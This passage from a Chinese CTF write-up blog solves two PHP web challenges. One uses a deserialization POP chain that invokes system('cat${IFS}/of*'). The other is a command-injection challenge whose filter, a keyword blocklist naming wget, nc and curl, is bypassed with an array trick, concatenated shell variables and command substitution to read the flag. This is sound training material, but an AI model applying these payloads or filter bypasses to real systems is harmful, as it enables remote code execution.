    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What do you want to do?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在反序列化的时候会自动触发destruct()函数进行，destruct()函数可以触发tostring()魔术方法，然后可以触发HeiCaFei下面的__call()魔术方法</p>
<p>这里对post传入的参数进行反序列化之后会抛出一个错误，导致后续的代码无法顺利的执行，就导致反序列化这一操作无法触发destruct()魔术方法。</p>
<p>payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">GOGOGO</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">public</span> <span class="token variable">$dengchao</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Go Go Go~
出发喽！
"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dengchao</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">DouBao</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">public</span> <span class="token variable">$dao</span><span class="token punctuation">;</span>
 <span class="token keyword">public</span> <span class="token variable">$Dagongren</span><span class="token punctuation">;</span>
 <span class="token keyword">public</span> <span class="token variable">$Bagongren</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Dagongren</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Bagongren</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Dagongren</span><span class="token punctuation">)</span>
<span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Bagongren</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Dagongren</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span>
<span class="token operator">></span>Bagongren<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span>
 <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dao</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'
诗⼈我吃！
'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">HeiCaFei</span><span class="token punctuation">&#123;</span>
 <span class="token keyword">public</span> <span class="token variable">$HongCaFei</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">HongCaFei</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token operator">=></span> <span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GOGOGO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DouBao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$c1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HeiCaFei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$c2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HeiCaFei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$c2</span><span class="token operator">-></span><span class="token property">HongCaFei</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
 <span class="token variable">$c1</span><span class="token operator">-></span><span class="token property">HongCaFei</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$c2</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"cat\$&#123;IFS&#125;/of*"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span><span class="token operator">-></span><span class="token property">dao</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$c1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span><span class="token operator">-></span><span class="token property">Dagongren</span> <span class="token operator">=</span> <span class="token variable">$test1</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span><span class="token operator">-></span><span class="token property">Bagongren</span> <span class="token operator">=</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
 <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">dengchao</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
 <span class="token variable">$pop</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment"># str_replace("i:1;i:0;", "i:0;i:0;",</span>
 <span class="token comment"># echo urlencode(serialize($pop));</span>
 <span class="token keyword">echo</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i%3A1%3Bi%3A0%3B%7D"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"i%3A1%3Bi%3A0%3B"</span><span class="token punctuation">,</span>
<span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关于以上的payload的解释</p>
<p>首先实例化两个error类然后将上面的两个error类分别赋值给dagongren和bagongren，这样可以使dagonren和bagongren两个对象本身不相等但是在经过__tostring()魔术方法处理之后的结果相等可以绕过哈希。</p>
<p>然后对Heichafei实例化两个对象$c1,$c2，c1将Heichafei类的hongchafei属性设置为system()函数，这样在call()魔术方法被调用的时候就会调用system()函数，将$c1的hongchafei属性设置为一个数组</p>
<p><code>[$c2, &quot;cat\$&#123;IFS&#125;/of*&quot;]</code>在这个对象中对$c2进行了调用，调用之后即为[system, “cat${IFS}&#x2F;of*”]</p>
<p>在__call()魔术方法被调用的时候就会进行调用。</p>
<p><code>cat\$&#123;IFS&#125;/of*</code>解释：${IFS}这里是空格的作用，反斜杠使防止对空格符号进行转移。</p>
<p>of*是一种模糊的通配符的匹配模式</p>
<p>$b-&gt;dao &#x3D; [$c1, ‘test’];被调用的时候实际调用的是$c1对象中的test()方法，但是$c1对象中没有的test()方法，就会触发__call()魔术方法</p>
<p>将DOUBAO类的实例化的对象赋值给GOGOGO的实例化对象的dengchao属性，可以触发__tostring()魔术方法</p>
<p>定义一个数组$pop &#x3D; array($a, 0)，其中包含两个元素，0的序列化的内容是i:1;i:0;}，经过替换之后会删掉最后的}导致序列化的数据不完整，前面的内容仍然能够解析，但是由于不完整又能够触发__destruct()魔术方法，从而能够绕过抛出异常。</p>
<p>使用上面得到的payload成功得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250626224146070.png" alt="image-20250626224146070"></p>
<h1 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$inputNumber</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\d/'</span><span class="token punctuation">,</span> <span class="token variable">$inputNumber</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"
不⾏不⾏
,
不能这样
"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$inputNumber</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"OK,
接下来你知道该怎么做吗
"</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span>
                <span class="token string single-quoted-string">'/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|
 od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|bas
 e|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\
 [|\]|flag|bash|env|!|\?|ls|\'|\"|id/i'</span><span class="token punctuation">,</span>
                <span class="token variable">$cmd</span>
            <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"
你传的参数似乎挺正经的
,
放你过去吧
&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono,hacker!!!"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先使用正则过滤了数字，使Number参数的参数值不能是数字，<code>intval()</code>函数用于将变量转化为整数类型，用于确保用户输入的值为整数。</p>
<p>这里可以用数组绕过</p>
<pre class="line-numbers language-none"><code class="language-none">?Number[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来是对POST传参的<code>cmd</code>的值进行的过滤，所有的相关的关键字和通配符，点号等都被过滤了</p>
<p>可以用拼接绕过来查看根目录下面有什么文件</p>
<pre class="line-numbers language-none"><code class="language-none">cmd&#x3D;a&#x3D;l;b&#x3D;s;$a$b &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到根目录下面有一个<code>flag.txt</code>文件</p>
<p>cat 命令也可以通过拼接出来</p>
<pre class="line-numbers language-none"><code class="language-none">cmd&#x3D;a&#x3D;c;b&#x3D;a;c&#x3D;t;d&#x3D;fl;e&#x3D;ag;f&#x3D;tx;g&#x3D;t;$a$b$c &#x2F;$d$e.$f$g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250609150836285.png" alt="image-20250609150836285"></p>
<p>可以看到因为文件名中的点号的原因被过滤了，实在是想不到怎么绕过这个点号了，看了大佬的<code>wp</code>发现这里的绕过方式是通过ls和head命令配合使用，如下：</p>
<pre class="line-numbers language-none"><code class="language-none">ls -a | head -n 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>首先ls -a会显示当前 目录下面的所有的隐藏文件(包括以点号开头的所有隐藏文件)</p>
<p>head命令用来限制文件名的输出，比如head -n 行数 （只返回前几行）</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250609152134469.png" alt="image-20250609152134469"></p>
<p>传ls -a命令可以看到第一个隐藏的文件名就是点号，所以使用head -n 1就可以提取到第一行的文件名(就是点号)</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">cmd&#x3D;a&#x3D;c;b&#x3D;at;c&#x3D;f;d&#x3D;lag;e&#x3D;t;f&#x3D;xt;g&#x3D;l;h&#x3D;s;i&#x3D;h;j&#x3D;ead;k&#x3D;$($g$h -a | $i$j -n 1);$a$b
 &#x2F;$c$d$k$e$f
 管道符的作用是将ls -a 的输出传递给head命令进行处理
 括号外的$符号的作用是表示首先执行括号内的命令，然后将输出结果作为字符串替换到当前位置。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250609153423167.png" alt="image-20250609153423167"></p>

        </div>
        
            <div class="post-container">
                <aside class="toc-container">
                    <button class="toc-toggle">文章目录</button>
                    <nav class="toc" id="toc"></nav>
                </aside>
            </div>
        
    </div>
    
    <!-- 评论系统 -->
    

    <!-- 返回主页链接 -->
    <div class="text-center my-8">
        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
    </div>

    <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
    <footer class="bg-black text-gray-400 py-4">
    <div class="container mx-auto text-center">
      <p>© <span id="current-year"></span>  ycycyc 
        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
    </div>
  </footer>
  
  <script> 
    document.getElementById("current-year").textContent = new Date().getFullYear();
  </script>
  

</body>
</html>